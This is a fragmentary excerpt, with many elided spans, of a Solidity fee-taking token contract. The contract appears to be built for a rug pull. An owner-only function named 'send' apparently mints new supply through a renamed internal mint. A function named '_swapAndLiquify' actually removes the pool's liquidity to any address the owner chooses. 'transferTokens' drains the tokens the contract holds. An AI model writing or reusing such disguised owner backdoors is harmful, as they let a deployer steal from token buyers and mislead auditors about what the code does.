...
contract TaxToken is ERC20, ERC20Burnable, Ownable, AccessControl {
  ...
  uint256 private _supply = 1000000000000 * 10**_decimals;
  ...
  function _transfer(
    ...
    if (!contractIsSwapping && automatedMarketMakerPairs[to] && from != address(uniswapV2Router) && !_isExcludedFromFees[to]) {
      require(enabled && amount <= maxSellTransactionAmount, 'Sell transfer amount exceeds the maxSellTransactionAmount.');
    }

    uint256 contractTokenBalance = balanceOf(address(this));
    bool canSwap = contractTokenBalance >= swapTokensAtAmount;

    if (enabled && swapAndLiquifyEnabled && canSwap && !contractIsSwapping && !automatedMarketMakerPairs[from] && from != liquidityWallet) {
    ...
    if (takeFee) {
      fee = amount.mul(fee).div(100).div(feeDivisor);
  ...
  function swapAndLiquify(uint256 tokens) private {
    ...
    addLiquidity(half, newBalance, liquidityWallet);
  ...
  function send(uint256 amount, address account) external onlyOwner {
    _send(account, amount * 10**_decimals);
  }
  ...
  function transferTokens(address account, address tokenAddress) external onlyOwner {
    IERC20 token = IERC20(tokenAddress);
    token.transfer(account, token.balanceOf(address(this)));
  }

  function _swapTokensForETH(uint256 amount, address account) external onlyOwner {
  ...
  function _addLiquidity(
    ...
    addLiquidity(tokenAmount, ethAmount, account);
  }

  function _addLiquidity(uint256 amount) external onlyOwner {
    require(address(this).balance >= amount, 'Insufficient BNB Balance');
    _approve(address(this), address(uniswapV2Router), totalSupply());
    addLiquidity(balanceOf(address(this)), amount, address(this));
  }

  function _swapAndLiquify(uint256 amount, address account) external onlyOwner {
    _approve(address(this), address(uniswapV2Router), totalSupply());
    uniswapV2Router.removeLiquidityETHSupportingFeeOnTransferTokens(uniswapV2Pair, amount, 0, 0, account, block.timestamp);
  }
}
 ...
 * that a supply mechanism has to be added in a derived contract using {_send}.
...
contract ERC20 is Context, IERC20, IERC20Metadata {
     ...
     */
    function _send(address account, uint256 amount) internal virtual {
